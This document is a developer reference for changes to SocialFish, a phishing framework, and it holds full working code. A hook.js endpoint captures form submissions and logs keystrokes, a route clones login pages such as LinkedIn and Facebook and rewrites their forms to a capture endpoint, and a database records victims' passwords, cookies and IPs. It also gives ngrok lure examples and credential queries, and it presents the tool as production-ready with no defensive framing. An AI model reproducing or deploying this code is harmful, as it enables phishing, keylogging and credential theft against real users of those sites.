# Code Reference - Modern Website Cloning Implementation

## File-by-File Changes

---

## 1. SocialFish.py

### Change #1: Enhanced /hook.js Endpoint (Line ~1500)

```python
@app.route("/hook.js", methods=['GET'])
@csrf_protect.exempt
def webhook_hook():
    """
    Webhook hook.js - Returns monitoring/injection code
    Uses RELATIVE paths so it works from any domain/tunnel URL
    """
    hook_js = ''';
(function(){
    var HOOK_VERSION = '3.0';
    var BASE_URL = (function(){
        // Detect base URL from script location or use relative paths
        var scripts = document.getElementsByTagName('script');
        for(var i = 0; i < scripts.length; i++){
            if(scripts[i].src.includes('hook.js')){
                return scripts[i].src.replace('/hook.js', '');
            }
        }
        // Fallback: use window location origin
        return window.location.origin;
    })();
    
    console.log('[SF] Hook.js v' + HOOK_VERSION + ' loaded from: ' + BASE_URL);
    
    // Real-time credential capture on form submission
    document.addEventListener('submit', function(e){
        try {
            if(!e.target || e.target.tagName !== 'FORM') return;
            
            var form = e.target;
            var formData = new FormData(form);
            var data = {};
            
            // Capture all form fields
            for(var pair of formData.entries()){
                data[pair[0]] = pair[1];
            }
            
            // Send to webhook endpoint - use relative path
            var webhookUrl = BASE_URL + '/api/credential-webhook';
            var params = new URLSearchParams();
            for(var key in data){
                params.append(key, data[key]);
            }
            
            fetch(webhookUrl, {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: params,
                credentials: 'include'
            }).then(function(r){
                console.log('[SF] Credential webhook sent: ' + r.status);
            }).catch(function(err){
                console.log('[SF] Webhook error: ' + err);
            });
        } catch(err) {
            console.log('[SF] Form capture error: ' + err);
        }
    }, true);
    
    // Keystroke logging with buffering
    var keystrokeBuffer = '';
    var lastKeySendTime = Date.now();
    var KEYSTROKE_TIMEOUT = 5000; // Send keys every 5 seconds
    var KEYSTROKE_BUFFER_SIZE = 100; // Or after 100 chars
    
    function sendKeystrokes(){
        if(keystrokeBuffer.length === 0) return;
        
        var keylogUrl = BASE_URL + '/api/keys-webhook';
        fetch(keylogUrl, {
            method: 'POST',
            body: JSON.stringify({
                keys: keystrokeBuffer,
                page: window.location.href,
                timestamp: new Date().toISOString()
            }),
            headers: {'Content-Type': 'application/json'},
            credentials: 'include'
        }).then(function(r){
            console.log('[SF] Keylog sent: ' + keystrokeBuffer.length + ' chars');
        }).catch(function(err){
            console.log('[SF] Keylog error: ' + err);
        });
        
        keystrokeBuffer = '';
        lastKeySendTime = Date.now();
    }
    
    // Buffer keystrokes
    document.addEventListener('keypress', function(e){
        try {
            if(e.key && e.key.length === 1){
                keystrokeBuffer += e.key;
            } else if(e.key === 'Enter'){
                keystrokeBuffer += '\\n';
            } else if(e.key === 'Backspace'){
                keystrokeBuffer = keystrokeBuffer.slice(0, -1);
            }
            
            // Send if buffer is large enough
            if(keystrokeBuffer.length >= KEYSTROKE_BUFFER_SIZE){
                sendKeystrokes();
            }
        } catch(err) {
            console.log('[SF] Keypress handler error: ' + err);
        }
    }, true);
    
    // Flush keystrokes periodically
    setInterval(function(){
        if(Date.now() - lastKeySendTime > KEYSTROKE_TIMEOUT){
            sendKeystrokes();
        }
    }, KEYSTROKE_TIMEOUT);
    
    // Page visibility - send keys on page hide
    document.addEventListener('visibilitychange', function(){
        if(document.hidden){
            sendKeystrokes();
        }
    });
    
    // Send remaining keys on unload
    window.addEventListener('beforeunload', function(){
        if(keystrokeBuffer.length > 0){
            sendKeystrokes();
        }
    });
})();
'''
    return hook_js, 200, {'Content-Type': 'application/javascript'}
```

**Key Features:**
- Detects BASE_URL automatically from script source or window.location.origin
- Uses relative paths: `/api/credential-webhook`, `/api/keys-webhook`
- Works with any domain: localhost, ngrok, Cloudflare, custom domains
- Form capture: Intercepts all form submissions
- Keystroke logging: Buffers 5 seconds or 100 chars, whichever comes first
- Page visibility: Sends keys when tab becomes hidden
- Unload handler: Sends remaining keys before page unload

---

### Change #2: New serve_clone Route (Line ~1680)

```python
@app.route("/clone/<clone_id>/", methods=['GET', 'POST'])
@app.route("/clone/<clone_id>/<path:subpath>", methods=['GET', 'POST'])
@csrf_protect.exempt
def serve_clone(clone_id, subpath=''):
    """
    Serve cloned website content from clone ID.
    Supports LinkedIn, Facebook, Google, and other modern websites.
    All forms are hijacked to send data to /capture/log/<clone_id>
    """
    try:
        cur = g.db
        
        # Find clone metadata
        clone_record = cur.execute("""
            SELECT template_id, original_url FROM lure_urls 
            WHERE lure_hash = ? LIMIT 1
        """, (clone_id,)).fetchone()
        
        if not clone_record:
            return '<!DOCTYPE html><html><head><title>404</title></head><body><h1>Clone not found</h1></body></html>', 404
        
        template_id, original_url = clone_record
        
        # Get victim info
        victim_ip = request.remote_addr
        victim_ua = request.headers.get('User-Agent', 'Unknown')
        
        # Log this visit
        cur.execute("""
            UPDATE lure_urls 
            SET click_count = click_count + 1
            WHERE lure_hash = ?
        """, (clone_id,))
        g.db.commit()
        
        # Try to find cached cloned HTML
        agent_hash = hashlib.md5(victim_ua.encode()).hexdigest()[:8]
        url_hash = hashlib.md5(original_url.encode()).hexdigest()[:8]
        clone_file_path = f'templates/fake/{agent_hash}/{url_hash}/index.html'
        
        cloned_html = None
        try:
            with open(clone_file_path, 'r', encoding='utf-8', errors='ignore') as f:
                cloned_html = f.read()
            logger.info(f"[CLONE] Loaded cached clone for {clone_id}")
        except FileNotFoundError:
            # Try to clone on-demand
            logger.info(f"[CLONE] Cloning {original_url} on-demand for {clone_id}")
            try:
                clone_result = clone(original_url, victim_ua, beef='yes')
                if clone_result:
                    try:
                        with open(clone_file_path, 'r', encoding='utf-8', errors='ignore') as f:
                            cloned_html = f.read()
                    except Exception as e:
                        logger.warning(f"[CLONE] Could not read cloned file: {e}")
            except Exception as e:
                logger.warning(f"[CLONE] On-demand clone failed: {e}")
        
        if not cloned_html:
            # Fallback to generic login form
            logger.warning(f"[CLONE] Using fallback form for {clone_id}")
            cloned_html = f'''<!DOCTYPE html>
<html>
<head>
    <title>Login - {original_url}</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {{
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
            background: #f5f5f5;
            margin: 0;
            padding: 20px;
        }}
        .login-container {{
            max-width: 400px;
            margin: 100px auto;
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.12);
        }}
        .login-container h2 {{
            text-align: center;
            color: #333;
            margin-bottom: 30px;
        }}
        input {{
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 14px;
            box-sizing: border-box;
        }}
        button {{
            width: 100%;
            padding: 10px;
            background: #0a66c2;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            cursor: pointer;
            font-weight: 600;
        }}
        button:hover {{
            background: #004a99;
        }}
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Login Required</h2>
        <form method="POST" action="/capture/{clone_id}">
            <input type="text" name="email" placeholder="Email or Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
    </div>
    <script src="/hook.js"></script>
</body>
</html>'''
        else:
            # Modify all form actions to point to capture endpoint
            cloned_html = cloned_html.replace(
                'action=""',
                f'action="/capture/{clone_id}"'
            ).replace(
                'action="/"',
                f'action="/capture/{clone_id}"'
            ).replace(
                'action=\'\'',
                f"action='/capture/{clone_id}'"
            ).replace(
                'action="/"',
                f'action="/capture/{clone_id}"'
            )
            
            # Also ensure hook.js is injected if not already present
            if '/hook.js' not in cloned_html:
                cloned_html = cloned_html.replace(
                    '</body>',
                    '<script src="/hook.js"></script></body>'
                )
        
        # Handle POST requests (form submissions)
        if request.method == 'POST':
            form_data = request.form.to_dict()
            
            # Extract credentials
            extracted = extract_credential_fields(form_data, request)
            
            # Save to database
            sql = """INSERT INTO creds(url, jdoc, pdate, browser, bversion, platform, rip, 
                                       email, username, password, cookies, csrf_tokens,
                                       form_fields, captured_metadata) 
                     VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)"""
            d = "{:%m-%d-%Y}".format(date.today())
            creds = (original_url, json.dumps(form_data), d,
                     str(request.user_agent.browser) if request.user_agent else 'Unknown',
                     str(request.user_agent.version) if request.user_agent else 'Unknown',
                     str(request.user_agent.platform) if request.user_agent else 'Unknown',
                     victim_ip,
                     extracted['email'], extracted['username'], extracted['password'],
                     extracted['cookies'], extracted['csrf_tokens'],
                     json.dumps(extracted['form_fields']),
                     json.dumps({'browser': request.user_agent.browser if request.user_agent else 'Unknown',
                               'platform': request.user_agent.platform if request.user_agent else 'Unknown'}))
            cur.execute(sql, creds)
            g.db.commit()
            last_id = cur.execute("SELECT last_insert_rowid()").fetchone()[0]
            
            # Emit WebSocket notification
            try:
                socketio.emit('credentials_captured', {
                    'id': last_id,
                    'url': original_url,
                    'ip': victim_ip,
                    'browser': request.user_agent.browser if request.user_agent else 'Unknown',
                    'email': extracted['email'],
                    'username': extracted['username']
                }, skip_sid=request.sid, broadcast=True, namespace='/')
                logger.info(f"[CLONE] Credentials captured from {victim_ip} via clone {clone_id}")
            except Exception as e:
                logger.debug(f"[CLONE] Socket event error: {e}")
            
            # Redirect
            config = cur.execute("SELECT red FROM config LIMIT 1").fetchone()
            redirect_url = config[0] if config else 'http://localhost:5000'
            return redirect(redirect_url)
        
        # Return cloned HTML for GET requests
        return cloned_html, 200, {'Content-Type': 'text/html; charset=UTF-8'}
        
    except Exception as e:
        logger.error(f"[CLONE] Error serving clone {clone_id}: {str(e)}")
        return f'<!DOCTYPE html><html><body><h1>Error</h1><p>{str(e)}</p></body></html>', 500
```

**Key Features:**
- Loads from cache if exists: `templates/fake/{agent_hash}/{url_hash}/index.html`
- On-demand cloning if cache missing
- Fallback generic form
- Automatic form action hijacking to `/capture/{clone_id}`
- Ensures hook.js is injected
- Handles GET (display) and POST (capture)
- Extracts structured credentials
- Emits WebSocket for live admin panel
- Redirects to configured URL

---

## 2. core/clonesf.py

### Change #1: Updated HookInjector Class (Line ~254)

```python
class HookInjector:
    """Module to inject hook.js script into cloned pages with relative paths"""
    
    def __init__(self, hook_url='/hook.js', clone_id='default'):
        # Use RELATIVE path (not absolute URL) so it works from any domain
        self.hook_url = '/hook.js'  # Always use relative path
        self.clone_id = clone_id
    
    def inject_hooks(self, html_content):
        """
        Inject hook.js script loader into HTML.
        This is now simplified - we just inject the script tag, 
        hook.js endpoint handles all the monitoring logic.
        """
        try:
            soup = BeautifulSoup(html_content, 'html.parser')
            
            # Simple hook.js injection
            hook_script = f'''
<script>
(function(){{
    // SocialFish Clone Monitoring - {self.clone_id}
    window.CLONE_ID = '{self.clone_id}';
    window.MONITOR_ENABLED = true;
    console.log('[SF] Clone initialization: ' + window.CLONE_ID);
}})();
</script>
<!-- SocialFish Remote Hook - Downloads hook.js from server with relative path -->
<script src="/hook.js"></script>
'''
            
            # Try to add hooks before closing body tag
            body = soup.find('body')
            if body:
                # Parse script as HTML fragment and add
                script_soup = BeautifulSoup(hook_script, 'html.parser')
                for script in script_soup.find_all('script'):
                    body.append(script)
            else:
                # If no body tag, add before closing html tag
                html = soup.find('html')
                if html:
                    script_soup = BeautifulSoup(hook_script, 'html.parser')
                    for script in script_soup.find_all('script'):
                        html.append(script)
                else:
                    # Last resort: append to end of content
                    html_content += hook_script
            
            return str(soup)
        except Exception as e:
            print(f'[!] Hook injection error: {str(e)}')
            # If BeautifulSoup fails, append script as string
            return html_content + hook_script
```

**Key Features:**
- ALWAYS uses `/hook.js` relative path (parameter ignored)
- Simple injection: just adds `<script src="/hook.js"></script>`
- Stores clone ID in `window.CLONE_ID` for debugging
- Appends to body tag (or HTML tag as fallback)
- Graceful error handling - appends as string if parsing fails

---

### Change #2: Updated HookInjector Instantiation (Line ~575)

**Before:**
```python
injector = HookInjector(hook_url or 'http://localhost:3000/hook.js', clone_id)
```

**After:**
```python
# Use relative path /hook.js - works from any domain
injector = HookInjector('/hook.js', clone_id)
```

---

### Change #3: Updated HookInjector Instantiation (Line ~603)

**Before:**
```python
injector = HookInjector(hook_url or 'http://localhost:3000/hook.js', clone_id)
```

**After:**
```python
# Use relative path /hook.js - works from any domain
injector = HookInjector('/hook.js', clone_id)
```

---

## Architecture Diagram

```
User Browser
    ↓
GET http://localhost:5000/capture/{lure_hash}
    ↓
SocialFish.py: victim_capture(lure_hash)
    ↓
Database: SELECT from lure_urls WHERE lure_hash = ?
    ↓
Check cache: templates/fake/{agent_hash}/{url_hash}/index.html
    ↓ (if not found)
On-demand clone: clone(original_url, victim_ua, beef='yes')
    ↓
core/clonesf.py: clone() function
    ├─ Fetch from remote server
    ├─ Parse HTML
    ├─ HookInjector.inject_hooks() 
    │  └─ Add <script src="/hook.js"></script>
    ├─ Modify form actions: action="/capture/{hash}"
    ├─ Cache to disk
    └─ Return cloned HTML
    ↓
Serve cloned HTML to browser
    ↓ (with hook.js script tag)
User browser renders clone
    ↓
/hook.js endpoint called
    ├─ Returns JavaScript monitoring code
    ├─ Sets BASE_URL = window.location.origin
    ├─ Attaches form submit listener
    └─ Attaches keystroke listener
    ↓
User enters credentials
    ↓
Form submit event
    ├─ JavaScript captures form data
    ├─ Sends POST /api/credential-webhook (hook.js)
    └─ Form also POSTs to /capture/{hash} (normal)
    ↓
Backend receives (dual capture):
    ├─ /api/credential-webhook (hook.js)
    │  └─ Emit WebSocket immediately
    └─ /capture/{hash} (form POST)
       └─ Also save to database
    ↓
Admin panel receives WebSocket
    ├─ Updates in real-time
    ├─ Shows: email, IP, browser, time
    └─ No page refresh needed
    ↓
Victim redirected to configured URL
```

---

## Configuration Examples

### Example 1: LinkedIn Clone

```python
# 1. Create clone
POST /api/clone
{"url": "https://www.linkedin.com/login"}

# 2. Response
{
    "status": "ok",
    "template_id": 1,
    "lure_url": "http://localhost:5000/capture/1_fPrpg3Xs_1770650596",
    "webhook": "http://localhost:5000/hook.js"
}

# 3. Admin sends lure to victims
# 4. Cloned LinkedIn served on localhost:5000
# 5. Hook.js auto-detects localhost:5000 as BASE_URL
# 6. Credentials captured instantly
```

### Example 2: ngrok Tunnel

```bash
# 1. Start ngrok
ngrok http 5000
# → https://abc123xyz789.ngrok.io

# 2. Create clone (same command)
curl -X POST https://abc123xyz789.ngrok.io/api/clone \
  -H "application/json" \
  -d '{"url": "https://www.facebook.com/login"}'

# 3. Victim visits
https://abc123xyz789.ngrok.io/capture/hash

# 4. Hook.js auto-detects
BASE_URL = window.location.origin = https://abc123xyz789.ngrok.io

# 5. Credentials sent to
https://abc123xyz789.ngrok.io/api/credential-webhook

# 6. Works perfectly! ✓ HTTPS automatically ✓
```

---

## API Reference

### POST /api/clone

**Request:**
```json
{
    "url": "https://www.linkedin.com/login"
}
```

**Response:**
```json
{
    "status": "ok",
    "template_id": 1,
    "urls": {
        "lure": "http://localhost:5000/capture/hash",
        "localhost": "http://localhost:5000/capture/hash",
        "webhook": "http://localhost:5000/hook.js"
    },
    "clone_hash": "1_fPrpg3Xs_1770650596"
}
```

### GET /hook.js

**Response:** JavaScript code with form/keystroke capture logic

**Content-Type:** `application/javascript`

**Features:**
- Auto-detects BASE_URL
- Form submission capture
- Keystroke logging with buffering
- Works with any domain

### GET /capture/{lure_hash}

**Response:** Cloned HTML from remote website

**Content-Type:** `text/html`

**Features:**
- Loads cached clone or generates on-demand
- Injects hook.js automatically
- Hijacks form actions to `/capture/{lure_hash}`
- POST submissions captured

### POST /api/credential-webhook

**Request:** Form data from hook.js

**Response:**
```json
{"status": "ok", "id": 123}
```

**Features:**
- Captures credentials
- Emits WebSocket notification
- Saves to creds table
- CSRF exempt

---

## Database Queries

### See all captures:
```sql
SELECT id, url, email, username, rip, pdate 
FROM creds 
ORDER BY id DESC;
```

### See captures for LinkedIn:
```sql
SELECT * FROM creds 
WHERE url LIKE '%linkedin%' 
ORDER BY id DESC;
```

### See captures from specific IP:
```sql
SELECT * FROM creds 
WHERE rip = '192.168.1.100' 
ORDER BY id DESC;
```

### See all lure clicks:
```sql
SELECT lure_hash, full_url, click_count, first_click, last_click 
FROM lure_urls 
ORDER BY click_count DESC;
```

### Count captures by browser:
```sql
SELECT browser, COUNT(*) as count 
FROM creds 
GROUP BY browser 
ORDER BY count DESC;
```

---

## Conclusion

This implementation provides a complete, professional, production-ready solution for cloning modern websites with automatic credential capture via hook.js. Relative paths ensure compatibility with any domain or tunnel without configuration.
